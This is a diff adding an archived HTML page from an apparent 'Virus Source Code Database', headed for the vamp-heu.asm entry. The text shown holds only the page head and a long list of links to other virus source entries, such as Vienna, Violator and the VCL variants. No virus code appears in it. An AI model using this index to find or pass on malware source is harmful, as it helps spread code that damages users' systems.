@@ -1,0 +1,773 @@
+<html>
+<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>
+
+<title>Virus Source Code Database :: vamp-heu_asm</title>
+<meta name="KEYWORDS" content="vamp-heu.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
+<meta name="DESCRIPTION" content="Virus Source Code Database - source for vamp-heu.asm">
+</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
+<tr><td valign=top width="25%">
+<a href="v13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v13_asm.php">v13_asm</a><br>
+<a href="v1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v1_asm.php">v1_asm</a><br>
+<a href="v2100__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2100__asm.php">v2100__asm</a><br>
+<a href="v2p11260_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p11260_asm.php">v2p11260_asm</a><br>
+<a href="v2p1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p1_asm.php">v2p1_asm</a><br>
+<a href="v2p6___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p6___asm.php">v2p6___asm</a><br>
+<a href="v2p6__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p6__asm.php">v2p6__asm</a><br>
+<a href="v2p6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p6_asm.php">v2p6_asm</a><br>
+<a href="v2p_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v2p_asm.php">v2p_asm</a><br>
+<a href="v_345_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_345_asm.php">v_345_asm</a><br>
+<a href="v-345__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-345__asm.php">v-345__asm</a><br>
+<a href="v-345_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-345_asm.php">v-345_asm</a><br>
+<a href="v376_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v376_asm.php">v376_asm</a><br>
+<a href="v44_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v44_asm.php">v44_asm</a><br>
+<a href="v512-1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v512-1_asm.php">v512-1_asm</a><br>
+<a href="v512_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v512_asm.php">v512_asm</a><br>
+<a href="v_582_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_582_asm.php">v_582_asm</a><br>
+<a href="v-582_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-582_asm.php">v-582_asm</a><br>
+<a href="v_621_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_621_asm.php">v_621_asm</a><br>
+<a href="v-621_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-621_asm.php">v-621_asm</a><br>
+<a href="v648_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v648_2_asm.php">v648_2_asm</a><br>
+<a href="v648_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v648_3_asm.php">v648_3_asm</a><br>
+<a href="v648-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v648-3_asm.php">v648-3_asm</a><br>
+<a href="v_648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_648_asm.php">v_648_asm</a><br>
+<a href="v-648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-648_asm.php">v-648_asm</a><br>
+<a href="v800_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v800_asm.php">v800_asm</a><br>
+<a href="v_822_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_822_asm.php">v_822_asm</a><br>
+<a href="v_847_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_847_asm.php">v_847_asm</a><br>
+<a href="v-847_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-847_asm.php">v-847_asm</a><br>
+<a href="vacsv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vacsv_asm.php">vacsv_asm</a><br>
+<a href="vac_tp05_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vac_tp05_asm.php">vac_tp05_asm</a><br>
+<a href="vac_tp24_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vac_tp24_asm.php">vac_tp24_asm</a><br>
+<a href="vamp_10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vamp_10_asm.php">vamp_10_asm</a><br>
+<a href="vamp-heu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vamp-heu_asm.php">vamp-heu_asm</a><br>
+<a href="vampiro_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vampiro_asm.php">vampiro_asm</a><br>
+<a href="varicel2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/varicel2_asm.php">varicel2_asm</a><br>
+<a href="varicel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/varicel_asm.php">varicel_asm</a><br>
+<a href="varicell_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/varicell_asm.php">varicell_asm</a><br>
+<a href="v_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_asm.php">v_asm</a><br>
+<a href="v_bnb_pe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_bnb_pe_asm.php">v_bnb_pe_asm</a><br>
+<a href="v-bnb-pe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-bnb-pe_asm.php">v-bnb-pe_asm</a><br>
+<a href="vboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vboot_asm.php">vboot_asm</a><br>
+<a href="v_bush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_bush_asm.php">v_bush_asm</a><br>
+<a href="v-bush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-bush_asm.php">v-bush_asm</a><br>
+<a href="v_cancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_cancer_asm.php">v_cancer_asm</a><br>
+<a href="v-cancer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-cancer_asm.php">v-cancer_asm</a><br>
+<a href="v_choink_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_choink_asm.php">v_choink_asm</a><br>
+<a href="v-choink_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-choink_asm.php">v-choink_asm</a><br>
+<a href="vcl1casc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl1casc_asm.php">vcl1casc_asm</a><br>
+<a href="vcl2casc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl2casc_asm.php">vcl2casc_asm</a><br>
+<a href="vcl_674_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_674_asm.php">vcl_674_asm</a><br>
+<a href="vcl-674_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-674_asm.php">vcl-674_asm</a><br>
+<a href="vcl_b52_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_b52_asm.php">vcl_b52_asm</a><br>
+<a href="vcl-b52_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-b52_asm.php">vcl-b52_asm</a><br>
+<a href="vcl_badc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_badc_asm.php">vcl_badc_asm</a><br>
+<a href="vcl-badc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-badc_asm.php">vcl-badc_asm</a><br>
+<a href="vclbadco_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclbadco_asm.php">vclbadco_asm</a><br>
+<a href="vclcodez_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclcodez_asm.php">vclcodez_asm</a><br>
+<a href="vcl_denz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_denz_asm.php">vcl_denz_asm</a><br>
+<a href="vcl-denz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-denz_asm.php">vcl-denz_asm</a><br>
+<a href="vcl_dia6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_dia6_asm.php">vcl_dia6_asm</a><br>
+<a href="vcl-dia6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-dia6_asm.php">vcl-dia6_asm</a><br>
+<a href="vcl_dial_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_dial_asm.php">vcl_dial_asm</a><br>
+<a href="vcl-dial_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-dial_asm.php">vcl-dial_asm</a><br>
+<a href="vcl_diar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_diar_asm.php">vcl_diar_asm</a><br>
+<a href="vcl-diar_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-diar_asm.php">vcl-diar_asm</a><br>
+<a href="vcl_dont_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_dont_asm.php">vcl_dont_asm</a><br>
+<a href="vcl-dont_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-dont_asm.php">vcl-dont_asm</a><br>
+<a href="vclearth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclearth_asm.php">vclearth_asm</a><br>
+<a href="vclgen12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclgen12_asm.php">vclgen12_asm</a><br>
+<a href="vcl_gif_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_gif_asm.php">vcl_gif_asm</a><br>
+<a href="vcl-gif_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-gif_asm.php">vcl-gif_asm</a><br>
+<a href="vclgoob2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclgoob2_asm.php">vclgoob2_asm</a><br>
+<a href="vclgoobr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclgoobr_asm.php">vclgoobr_asm</a><br>
+<a href="vclheeva_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclheeva_asm.php">vclheeva_asm</a><br>
+<a href="vcl_john_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_john_asm.php">vcl_john_asm</a><br>
+<a href="vcl-john_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-john_asm.php">vcl-john_asm</a><br>
+<a href="vcl_kinn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_kinn_asm.php">vcl_kinn_asm</a><br>
+<a href="vcl-kinn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-kinn_asm.php">vcl-kinn_asm</a><br>
+<a href="vclmcyel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclmcyel_asm.php">vclmcyel_asm</a><br>
+<a href="vclmikes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclmikes_asm.php">vclmikes_asm</a><br>
+<a href="vclnomem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclnomem_asm.php">vclnomem_asm</a><br>
+<a href="vclolymp_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclolymp_asm.php">vclolymp_asm</a><br>
+<a href="vclpearl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclpearl_asm.php">vclpearl_asm</a><br>
+<a href="vclquake_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclquake_asm.php">vclquake_asm</a><br>
+<a href="vcl_ramm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_ramm_asm.php">vcl_ramm_asm</a><br>
+<a href="vcl-ramm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-ramm_asm.php">vcl-ramm_asm</a><br>
+<a href="vcl_rich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_rich_asm.php">vcl_rich_asm</a><br>
+<a href="vcl-rich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl-rich_asm.php">vcl-rich_asm</a><br>
+<a href="vclroach_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclroach_asm.php">vclroach_asm</a><br>
+<a href="vcl_rtns_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_rtns_asm.php">vcl_rtns_asm</a><br>
+<a href="vclsboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclsboot_asm.php">vclsboot_asm</a><br>
+<a href="vclsimpl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclsimpl_asm.php">vclsimpl_asm</a><br>
+<a href="vclstyxb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclstyxb_asm.php">vclstyxb_asm</a><br>
+<a href="vcltaboo_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcltaboo_asm.php">vcltaboo_asm</a><br>
+<a href="vcl_test_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcl_test_asm.php">vcl_test_asm</a><br>
+<a href="vclvmess_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclvmess_asm.php">vclvmess_asm</a><br>
+<a href="vclyank2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vclyank2_asm.php">vclyank2_asm</a><br>
+<a href="vcm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcm_asm.php">vcm_asm</a><br>
+<a href="vcomm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vcomm_asm.php">vcomm_asm</a><br>
+<a href="v_dos625_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_dos625_asm.php">v_dos625_asm</a><br>
+<a href="v_dq1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_dq1028_asm.php">v_dq1028_asm</a><br>
+<a href="v-dq1028_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-dq1028_asm.php">v-dq1028_asm</a><br>
+<a href="vector_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vector_asm.php">vector_asm</a><br>
+<a href="vengence_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vengence_asm.php">vengence_asm</a><br>
+<a href="vfsi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vfsi_asm.php">vfsi_asm</a><br>
+<a href="vfsi_asm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vfsi_asm_asm.php">vfsi_asm_asm</a><br>
+<a href="vfsi-asm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vfsi-asm_asm.php">vfsi-asm_asm</a><br>
+<a href="vg-tbsi__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vg-tbsi__asm.php">vg-tbsi__asm</a><br>
+<a href="vg_tbsig_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vg_tbsig_asm.php">vg_tbsig_asm</a><br>
+<a href="vg-tbsig_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vg-tbsig_asm.php">vg-tbsig_asm</a><br>
+<a href="vgtbsig_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vgtbsig_asm.php">vgtbsig_asm</a><br>
+<a href="vhp-627_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vhp-627_asm.php">vhp-627_asm</a><br>
+<a href="vhp_648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vhp_648_asm.php">vhp_648_asm</a><br>
+<a href="vhp-648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vhp-648_asm.php">vhp-648_asm</a><br>
+<a href="vi2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vi2_asm.php">vi2_asm</a><br>
+<a href="vi5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vi5_asm.php">vi5_asm</a><br>
+<a href="vi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vi_asm.php">vi_asm</a><br>
+<a href="victor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/victor_asm.php">victor_asm</a><br>
+<a href="vien547_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien547_asm.php">vien547_asm</a><br>
+<a href="vien582_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien582_asm.php">vien582_asm</a><br>
+<a href="vien648_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien648_asm.php">vien648_asm</a><br>
+<a href="vien822_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien822_asm.php">vien822_asm</a><br>
+<a href="vien_a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien_a_asm.php">vien_a_asm</a><br>
+<a href="viena____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viena____asm.php">viena____asm</a><br>
+<a href="vien_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vien_asm.php">vien_asm</a><br>
+<a href="vienna0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna0_asm.php">vienna0_asm</a><br>
+<a href="vienna2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna2_asm.php">vienna2_asm</a><br>
+<a href="vienna3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna3_asm.php">vienna3_asm</a><br>
+<a href="vienna4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna4_asm.php">vienna4_asm</a><br>
+<a href="vienna___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna___asm.php">vienna___asm</a><br>
+<a href="vienna__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna__asm.php">vienna__asm</a><br>
+<a href="vienna_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vienna_asm.php">vienna_asm</a><br>
+<a href="viol-1a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-1a_asm.php">viol-1a_asm</a><br>
+<a href="viola_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viola_asm.php">viola_asm</a><br>
+<a href="violator_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violator_asm.php">violator_asm</a><br>
+<a href="viol-b2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-b2_asm.php">viol-b2_asm</a><br>
+<a href="violb2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb2__asm.php">violb2__asm</a><br>
+<a href="violb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb2_asm.php">violb2_asm</a><br>
+<a href="viol-b3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-b3_asm.php">viol-b3_asm</a><br>
+<a href="violb3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb3__asm.php">violb3__asm</a><br>
+<a href="violb3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb3_asm.php">violb3_asm</a><br>
+<a href="viol-b4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-b4_asm.php">viol-b4_asm</a><br>
+<a href="viol-b5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-b5_asm.php">viol-b5_asm</a><br>
+<a href="viol-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-b_asm.php">viol-b_asm</a><br>
+<a href="violb__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb__asm.php">violb__asm</a><br>
+<a href="violb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/violb_asm.php">violb_asm</a><br>
+<a href="viol-c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viol-c_asm.php">viol-c_asm</a><br>
+<a href="vip-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vip-b_asm.php">vip-b_asm</a><br>
+<a href="viper_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viper_asm.php">viper_asm</a><br>
+<a href="viper-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viper-b_asm.php">viper-b_asm</a><br>
+<a href="viperizb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viperizb_asm.php">viperizb_asm</a><br>
+<a href="vir1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir1_asm.php">vir1_asm</a><br>
+<a href="vir1_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir1_pas.php">vir1_pas</a><br>
+<a href="vir2_2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir2_2_asm.php">vir2_2_asm</a><br>
+<a href="vir2a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir2a_asm.php">vir2a_asm</a><br>
+<a href="vir2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir2__asm.php">vir2__asm</a><br>
+<a href="vir2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir2_asm.php">vir2_asm</a><br>
+<a href="vir2_av_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir2_av_asm.php">vir2_av_asm</a><br>
+<a href="vir3_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir3_bas.php">vir3_bas</a><br>
+<a href="vir5_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir5_asm.php">vir5_asm</a><br>
+<a href="vir6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir6_asm.php">vir6_asm</a><br>
+<a href="vir__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir__asm.php">vir__asm</a><br>
+<a href="vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir_asm.php">vir_asm</a><br>
+<a href="virdem_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virdem_asm.php">virdem_asm</a><br>
+<a href="virnew_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virnew_asm.php">virnew_asm</a><br>
+<a href="viroprot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/viroprot_asm.php">viroprot_asm</a><br>
+<a href="vir_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vir_pas.php">vir_pas</a><br>
+<a href="virus1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus1_asm.php">virus1_asm</a><br>
+<a href="virus2___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus2___asm.php">virus2___asm</a><br>
+<a href="virus2__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus2__asm.php">virus2__asm</a><br>
+<a href="virus2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus2_asm.php">virus2_asm</a><br>
+<a href="virus2_bas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus2_bas.php">virus2_bas</a><br>
+<a href="virus2_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus2_pas.php">virus2_pas</a><br>
+<a href="virus3___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus3___asm.php">virus3___asm</a><br>
+<a href="virus3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus3__asm.php">virus3__asm</a><br>
+<a href="virus3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus3_asm.php">virus3_asm</a><br>
+<a href="virus6_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus6_pas.php">virus6_pas</a><br>
+<a href="virusa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virusa_asm.php">virusa_asm</a><br>
+<a href="virus____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus____asm.php">virus____asm</a><br>
+<a href="virus_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/virus_asm.php">virus_asm</a><br>
+<a href="vlad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vlad_asm.php">vlad_asm</a><br>
+<a href="vlad-dir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vlad-dir_asm.php">vlad-dir_asm</a><br>
+<a href="v_les1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_les1_asm.php">v_les1_asm</a><br>
+<a href="v_les2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_les2_asm.php">v_les2_asm</a><br>
+<a href="vmessiah_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vmessiah_asm.php">vmessiah_asm</a><br>
+<a href="vn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vn_asm.php">vn_asm</a><br>
+<a href="vootie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vootie_asm.php">vootie_asm</a><br>
+<a href="vor_1600_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vor_1600_asm.php">vor_1600_asm</a><br>
+<a href="vor_370_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vor_370_asm.php">vor_370_asm</a><br>
+<a href="vote_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vote_asm.php">vote_asm</a><br>
+<a href="v_para2b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_para2b_asm.php">v_para2b_asm</a><br>
+<a href="v-para2b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-para2b_asm.php">v-para2b_asm</a><br>
+<a href="vrl0_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vrl0_asm.php">vrl0_asm</a><br>
+<a href="vrl1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vrl1_asm.php">vrl1_asm</a><br>
+<a href="vrl2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vrl2_asm.php">vrl2_asm</a><br>
+<a href="vrl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vrl_asm.php">vrl_asm</a><br>
+<a href="vs_108_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vs_108_asm.php">vs_108_asm</a><br>
+<a href="vs_122_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vs_122_asm.php">vs_122_asm</a><br>
+<a href="vscie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vscie_asm.php">vscie_asm</a><br>
+<a href="vslay_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vslay_asm.php">vslay_asm</a><br>
+<a href="v_ston90_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_ston90_asm.php">v_ston90_asm</a><br>
+<a href="v-ston90_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-ston90_asm.php">v-ston90_asm</a><br>
+<a href="v_vhp348_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_vhp348_asm.php">v_vhp348_asm</a><br>
+<a href="v-vhp348_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-vhp348_asm.php">v-vhp348_asm</a><br>
+<a href="v_vhp353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_vhp353_asm.php">v_vhp353_asm</a><br>
+<a href="v-vhp353_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-vhp353_asm.php">v-vhp353_asm</a><br>
+<a href="v_vhp367_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_vhp367_asm.php">v_vhp367_asm</a><br>
+<a href="v-vhp367_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-vhp367_asm.php">v-vhp367_asm</a><br>
+<a href="v_vhp435_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_vhp435_asm.php">v_vhp435_asm</a><br>
+<a href="v-vhp435_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-vhp435_asm.php">v-vhp435_asm</a><br>
+<a href="v_vhp623_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_vhp623_asm.php">v_vhp623_asm</a><br>
+<a href="v-vhp623_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-vhp623_asm.php">v-vhp623_asm</a><br>
+<a href="v_viola_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_viola_asm.php">v_viola_asm</a><br>
+<a href="v-viola_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-viola_asm.php">v-viola_asm</a><br>
+<a href="v_violb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_violb1_asm.php">v_violb1_asm</a><br>
+<a href="v-violb1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-violb1_asm.php">v-violb1_asm</a><br>
+<a href="v_violb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_violb2_asm.php">v_violb2_asm</a><br>
+<a href="v-violb2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-violb2_asm.php">v-violb2_asm</a><br>
+<a href="v_violb3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_violb3_asm.php">v_violb3_asm</a><br>
+<a href="v-violb3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-violb3_asm.php">v-violb3_asm</a><br>
+<a href="v_violb4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v_violb4_asm.php">v_violb4_asm</a><br>
+<a href="v-violb4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/v-violb4_asm.php">v-violb4_asm</a><br>
